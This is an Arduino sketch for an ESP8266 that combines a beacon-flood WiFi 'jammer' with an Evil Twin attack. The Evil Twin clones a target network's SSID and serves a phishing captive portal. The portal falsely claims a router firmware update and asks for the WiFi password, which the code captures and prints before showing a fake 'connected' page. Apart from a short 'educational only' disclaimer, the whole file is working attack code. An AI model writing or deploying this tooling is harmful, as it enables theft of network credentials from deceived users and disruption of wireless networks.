/*
 * ESP8266 WiFi Jammer - Cybersecurity Project
 * WARNING: For EDUCATIONAL purposes only! 
 * Only use on networks you own or have explicit permission to test.
 * Unauthorized use is ILLEGAL!
 * 
 * This works on ESP8266 because it supports raw packet injection
 * Evil Twin captures WiFi passwords via captive portal
 */

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

extern "C" {
  #include "user_interface.h"
}

// Beacon frame for jamming
uint8_t beaconPacket[128] = {
  0x80, 0x00,                         // Type: Beacon
  0x00, 0x00,                         // Duration
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source (random)
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (random)
  0x00, 0x00,                         // Sequence
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
  0x64, 0x00,                         // Beacon interval
  0x11, 0x04,                         // Capability info
  0x00, 0x00                          // SSID parameter set (will be filled)
};

String targetSSID = "";
uint8_t targetMAC[6] = {0};
int targetChannel = 1;
bool jammerActive = false;
bool evilTwinActive = false;
int packetsSent = 0;
int connectedDevices = 0;

// Captive portal
ESP8266WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;
String capturedPassword = "";
bool passwordCaptured = false;

void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\nESP8266 WiFi Jammer");
  Serial.println("Beacon spam jammer!");
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  
  Serial.println("Ready.\n");
  showMenu();
}

void loop() {
  // Handle Evil Twin captive portal
  if (evilTwinActive) {
    dnsServer.processNextRequest();
    server.handleClient();
    
    // Update connected devices count
    static unsigned long lastCheck = 0;
    if (millis() - lastCheck > 2000) { // Check every 2 seconds
      int newCount = WiFi.softAPgetStationNum();
      if (newCount != connectedDevices) {
        connectedDevices = newCount;
        Serial.print("\n📱 Connected Devices: ");
        Serial.println(connectedDevices);
      }
      lastCheck = millis();
    }
  }
  
  if (Serial.available()) {
    String input = Serial.readStringUntil('\n');
    input.trim();
    
    if (input == "1") scanNetworks();
    else if (input == "2") setTarget();
    else if (input == "3") startJammer();
    else if (input == "4") stopJammer();
    else if (input == "5") startEvilTwin();
    else if (input == "6") stopEvilTwin();
    else if (input == "7") showMenu();
    else {
      Serial.println("Invalid!");
      showMenu();
    }
  }
  
  // Send beacon spam if active
  if (jammerActive) {
    // Generate random SSID
    char randomSSID[33];
    for (int i = 0; i < 8; i++) {
      randomSSID[i] = random(65, 90); // A-Z
    }
    randomSSID[8] = '\0';
    
    // Random MAC
    for (int i = 0; i < 6; i++) {
      beaconPacket[10 + i] = random(256);
      beaconPacket[16 + i] = beaconPacket[10 + i];
    }
    
    // Build SSID tag
    uint8_t packet[128];
    memcpy(packet, beaconPacket, 38);
    packet[38] = 0x00; // SSID tag
    packet[39] = strlen(randomSSID);
    memcpy(&packet[40], randomSSID, strlen(randomSSID));
    
    int len = 40 + strlen(randomSSID);
    
    wifi_send_pkt_freedom(packet, len, 0);
    packetsSent++;
    
    if (packetsSent % 100 == 0) {
      Serial.printf("Beacon packets: %d\n", packetsSent);
    }
    delay(1);
  }
}

void showMenu() {
  Serial.println("\n╔════════════════════════════════════════════════════════╗");
  Serial.println("║                    WIFI JAMMER MENU                    ║");
  Serial.println("╠════════════════════════════════════════════════════════╣");
  Serial.println("║  1-Scan Networks    │  2-Set Target  │  3-Start Jammer ║");
  Serial.println("║  4-Stop Jammer      │  5-Evil Twin   │  6-Stop ET      ║");
  Serial.println("║  7-Show Menu        │                │                 ║");
  Serial.println("╠════════════════════════════════════════════════════════╣");
  Serial.println("║                    CURRENT STATUS                      ║");
  Serial.println("╠═══════════════╦═════════════╦══════════╦═══════════════╣");
  Serial.println("║ Target        │ Jammer      │ Evil Twin│ Devices       ║");
  Serial.println("╠═══════════════╬═════════════╬══════════╬═══════════════╣");
  
  Serial.print("║ ");
  String target = targetSSID.length() > 0 ? targetSSID : "None";
  Serial.print(target);
  for (int i = target.length(); i < 13; i++) Serial.print(" ");
  Serial.print(" │ ");
  
  String jamStatus = jammerActive ? "ON " : "OFF";
  Serial.print(jamStatus);
  for (int i = jamStatus.length(); i < 11; i++) Serial.print(" ");
  Serial.print(" │ ");
  
  String etStatus = evilTwinActive ? "ON " : "OFF";
  Serial.print(etStatus);
  for (int i = etStatus.length(); i < 8; i++) Serial.print(" ");
  Serial.print(" │ ");
  
  String devCount = String(connectedDevices);
  Serial.print(devCount);
  for (int i = devCount.length(); i < 13; i++) Serial.print(" ");
  Serial.println(" ║");
  
  Serial.println("╚═══════════════╩═════════════╩══════════╩═══════════════╝");
}

void scanNetworks() {
  Serial.println("Scanning...");
  int n = WiFi.scanNetworks();
  if (n == 0) {
    Serial.println("None found");
  } else {
    for (int i = 0; i < n; i++) {
      Serial.printf("%d)%s Ch%d %ddB ", i+1, WiFi.SSID(i).c_str(), WiFi.channel(i), WiFi.RSSI(i));
      uint8_t* bssid = WiFi.BSSID(i);
      for (int j = 0; j < 6; j++) {
        Serial.printf("%02X", bssid[j]);
        if (j < 5) Serial.print(":");
      }
      Serial.println();
    }
  }
  showMenu();
}

void setTarget() {
  Serial.println("SSID:");
  while (!Serial.available()) delay(10);
  String ssid = Serial.readStringUntil('\n');
  ssid.trim();
  
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; i++) {
    if (WiFi.SSID(i) == ssid) {
      targetSSID = ssid;
      targetChannel = WiFi.channel(i);
      uint8_t* bssid = WiFi.BSSID(i);
      memcpy(targetMAC, bssid, 6);
      
      Serial.print("Target: ");
      Serial.print(targetSSID);
      Serial.print(" Ch");
      Serial.println(targetChannel);
      showMenu();
      return;
    }
  }
  Serial.println("Not found!");
  showMenu();
}

void startJammer() {
  if (jammerActive) {
    Serial.println("Already running!");
    return;
  }
  
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(targetChannel);
  
  jammerActive = true;
  packetsSent = 0;
  
  Serial.println("JAMMER STARTED!");
  Serial.printf("Flooding Ch%d with fake APs\n", targetChannel);
  showMenu();
}

void stopJammer() {
  if (!jammerActive) {
    Serial.println("Not active");
    return;
  }
  
  jammerActive = false;
  Serial.printf("JAMMER STOPPED. Sent %d packets\n", packetsSent);
  showMenu();
}

void startEvilTwin() {
  if (targetSSID.length() == 0) {
    Serial.println("No target!");
    return;
  }
  if (evilTwinActive) {
    Serial.println("Already running!");
    return;
  }
  
  // Stop jammer if running
  if (jammerActive) {
    jammerActive = false;
    Serial.println("Jammer stopped for Evil Twin");
  }
  
  // Create open AP with target SSID
  WiFi.mode(WIFI_AP);
  WiFi.softAP(targetSSID.c_str());
  
  // Start DNS server (captive portal)
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  
  // Setup web server routes
  server.on("/", handleRoot);
  server.on("/submit", handleSubmit);
  server.on("/generate_204", handleRoot);  // Android captive portal check
  server.on("/gen_204", handleRoot);       // Android
  server.on("/hotspot-detect.html", handleRoot); // iOS
  server.onNotFound(handleRoot);
  server.begin();
  
  passwordCaptured = false;
  capturedPassword = "";
  connectedDevices = 0;
  
  Serial.println("\n╔════════════════════════════════════════╗");
  Serial.println("║      🎯 EVIL TWIN ACTIVATED 🎯        ║");
  Serial.println("╠════════════════════════════════════════╣");
  Serial.print("║ SSID: ");
  Serial.print(targetSSID);
  for (int i = targetSSID.length(); i < 29; i++) Serial.print(" ");
  Serial.println("║");
  Serial.print("║ IP:   ");
  String ip = WiFi.softAPIP().toString();
  Serial.print(ip);
  for (int i = ip.length(); i < 29; i++) Serial.print(" ");
  Serial.println("║");
  Serial.println("║ Status: Waiting for victims...        ║");
  Serial.println("╚════════════════════════════════════════╝\n");
  
  evilTwinActive = true;
  showMenu();
}

void stopEvilTwin() {
  if (!evilTwinActive) {
    Serial.println("Not active");
    return;
  }
  
  server.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  
  evilTwinActive = false;
  
  Serial.println("\n╔════════════════════════════════════════╗");
  Serial.println("║      🛑 EVIL TWIN STOPPED 🛑          ║");
  Serial.println("╠════════════════════════════════════════╣");
  if (capturedPassword.length() > 0) {
    Serial.println("║ ✅ PASSWORD CAPTURED!                 ║");
    Serial.println("╠════════════════════════════════════════╣");
    Serial.print("║ ");
    Serial.print(capturedPassword);
    for (int i = capturedPassword.length(); i < 38; i++) Serial.print(" ");
    Serial.println("║");
  } else {
    Serial.println("║ ❌ No password captured               ║");
  }
  Serial.println("╚════════════════════════════════════════╝\n");
  
  connectedDevices = 0;
  showMenu();
}

// Captive Portal - Login Page
void handleRoot() {
  String html = "<!DOCTYPE html><html><head>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>";
  html += "body{font-family:Arial;margin:0;padding:20px;background:#f0f0f0;}";
  html += ".container{max-width:400px;margin:0 auto;background:white;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}";
  html += "h2{color:#333;text-align:center;margin-bottom:10px;}";
  html += ".subtitle{text-align:center;color:#666;font-size:14px;margin-bottom:25px;}";
  html += "input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:5px;box-sizing:border-box;font-size:16px;}";
  html += "button{width:100%;padding:12px;background:#007bff;color:white;border:none;border-radius:5px;font-size:16px;cursor:pointer;margin-top:10px;}";
  html += "button:hover{background:#0056b3;}";
  html += ".info{background:#e7f3ff;padding:12px;border-radius:5px;margin-bottom:20px;font-size:14px;color:#004085;}";
  html += "</style></head><body>";
  html += "<div class='container'>";
  html += "<h2>WiFi Network</h2>";
  html += "<div class='subtitle'>" + targetSSID + "</div>";
  html += "<div class='info'>⚠️ Router firmware update required. Please re-enter your WiFi password to continue.</div>";
  html += "<form action='/submit' method='POST'>";
  html += "<input type='text' name='ssid' value='" + targetSSID + "' readonly>";
  html += "<input type='password' name='password' placeholder='Enter WiFi Password' required autofocus>";
  html += "<button type='submit'>Connect</button>";
  html += "</form>";
  html += "</div></body></html>";
  
  server.send(200, "text/html", html);
}

// Handle password submission
void handleSubmit() {
  if (server.hasArg("password")) {
    capturedPassword = server.arg("password");
    passwordCaptured = true;
    
    Serial.println("\n🎯 PASSWORD CAPTURED! 🎯");
    Serial.print("SSID: ");
    Serial.println(targetSSID);
    Serial.print("Password: ");
    Serial.println(capturedPassword);
    Serial.println("====================\n");
    
    // Success page - user thinks they're connected
    String html = "<!DOCTYPE html><html><head>";
    html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
    html += "<meta http-equiv='refresh' content='3;url=http://www.google.com'>";
    html += "<style>";
    html += "body{font-family:Arial;margin:0;padding:20px;background:#f0f0f0;}";
    html += ".container{max-width:400px;margin:50px auto;background:white;padding:30px;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1);text-align:center;}";
    html += "h2{color:#28a745;margin-bottom:15px;}";
    html += ".checkmark{font-size:60px;color:#28a745;}";
    html += "p{color:#666;font-size:16px;}";
    html += "</style></head><body>";
    html += "<div class='container'>";
    html += "<div class='checkmark'>✓</div>";
    html += "<h2>Connected Successfully!</h2>";
    html += "<p>You are now connected to " + targetSSID + "</p>";
    html += "<p>Redirecting...</p>";
    html += "</div></body></html>";
    
    server.send(200, "text/html", html);
  } else {
    server.send(400, "text/plain", "Bad Request");
  }
}
